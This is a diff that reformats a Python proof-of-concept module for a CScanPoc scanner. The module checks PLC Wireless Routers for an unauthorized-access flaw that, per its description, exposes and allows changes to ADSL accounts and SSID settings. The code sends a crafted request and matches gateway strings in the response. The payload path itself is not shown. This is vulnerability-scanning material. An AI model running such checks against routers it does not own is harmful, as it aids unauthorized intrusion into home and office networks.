@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'PLCRouter_0001'  # 平台漏洞编号，留空
     name = 'PLC Wireless Router 未授权访问'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         PLC Wireless Router 未授权访问 ，可获取和更改路由器所有内容（asdl账号，ssid等）。
@@ -18,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PLCRouter'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '95d0e3d1-7800-4e14-833e-ea4cc77c46b1'
@@ -38,8 +41,8 @@ class Poc(ABPoc):
             target = arg + payload
             code, head, res, errcode, _ = hh.http(target)
 
-            if code==200 and 'Default Gateway Mode' in res and 'Current Default Gateway' in res:
-                #security_hole(target)
+            if code == 200 and 'Default Gateway Mode' in res and 'Current Default Gateway' in res:
+                # security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -48,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
